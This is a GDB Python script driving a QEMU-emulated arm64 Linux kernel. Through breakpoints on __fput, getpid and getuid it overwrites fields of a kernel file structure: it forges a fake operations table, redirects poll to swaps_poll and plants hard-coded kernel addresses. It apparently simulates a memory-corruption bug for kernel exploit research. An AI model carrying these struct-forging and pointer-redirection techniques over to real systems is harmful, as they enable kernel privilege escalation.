import gdb
import time
import sys

gdb.execute("set pagination off")
gdb.execute("set confirm off")
gdb.execute("set non-stop off")

def log(msg):
    print(f"[M5-GDB] {msg}", flush=True)
    sys.stdout.flush()

def to_u64(val):
    return int(val) & 0xFFFFFFFFFFFFFFFF

for i in range(10):
    try:
        gdb.execute("target remote :1234")
        log("Connected to QEMU on :1234")
        break
    except gdb.error:
        time.sleep(1)

g_target_file = 0

class FputBreakpoint(gdb.Breakpoint):
    def __init__(self):
        super(FputBreakpoint, self).__init__("__fput", internal=False)
        self.enabled = False

    def stop(self):
        global g_target_file
        file_ptr = to_u64(gdb.parse_and_eval("$x0"))
        
        if g_target_file == 0:
            try:
                f_ep = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({file_ptr} + 208)"))
            except Exception:
                return False

            if f_ep != 0:
                log(f"Intercepted __fput for target (file={hex(file_ptr)}). Saving address and zeroing f_ep.")
                g_target_file = file_ptr
                gdb.execute(f"set *(unsigned long*)({file_ptr} + 208) = 0")
                empty_zero_page = 0xffffffc0098fd000
                gdb.execute(f"set *(unsigned long*)({file_ptr} + 40) = {empty_zero_page}")
                self.enabled = False
        return False

class GetpidBreakpoint(gdb.Breakpoint):
    def __init__(self):
        super(GetpidBreakpoint, self).__init__("__arm64_sys_getpid", internal=False)

    def stop(self):
        log("Intercepted getpid. Enabling __fput hook.")
        bp_fput.enabled = True
        self.enabled = False
        return False

class GetuidBreakpoint(gdb.Breakpoint):
    def __init__(self):
        super(GetuidBreakpoint, self).__init__("__arm64_sys_getuid", internal=False)

    def stop(self):
        global g_target_file
        if g_target_file != 0:
            log(f"Intercepted getuid. Injecting layout into target={hex(g_target_file)}")
            
            empty_zero_page = 0xffffffc0098fd000
            comm_inode = 0xffffffc00973e258 - 0x40
            fep_cleared_addr = 0xffffffc00994e920
            
            try:
                swaps_poll_addr = to_u64(gdb.parse_and_eval("&swaps_poll"))
            except Exception as e:
                log(f"Failed to read swaps_poll_addr: {e}")
                return False
                
            log(f"Using swaps_poll_addr = {hex(swaps_poll_addr)}")
            
            fake_fops = g_target_file
            
            gdb.execute(f"set *(unsigned long*)({g_target_file} + 32) = {comm_inode}") # f_inode
            gdb.execute(f"set *(unsigned long*)({g_target_file} + 40) = {fake_fops}") # f_op
            gdb.execute(f"set *(unsigned int*)({g_target_file} + 48) = 0") # f_lock
            gdb.execute(f"set *(unsigned long*)({g_target_file} + 56) = 1") # f_count
            gdb.execute(f"set *(unsigned int*)({g_target_file} + 68) = 0x20000") # f_mode
            gdb.execute(f"set *(unsigned long*)({g_target_file} + 208) = {empty_zero_page}") # f_ep
            gdb.execute(f"set *(unsigned long*)({g_target_file} + 184) = 0") # f_version
            
            # set fake_fops->poll
            gdb.execute(f"set *(unsigned long*)({g_target_file} + 72) = {swaps_poll_addr}") 
            
            # set private_data
            gdb.execute(f"set *(unsigned long*)({g_target_file} + 200) = {fep_cleared_addr - 0x60}")
            
            self.enabled = False
        return False

bp_fput = FputBreakpoint()
bp_getpid = GetpidBreakpoint()
bp_getuid = GetuidBreakpoint()

log("Breakpoints installed. Continuing...")
try:
    gdb.execute("continue")
except Exception as e:
    log(f"Exception: {e}")
gdb.execute("quit")
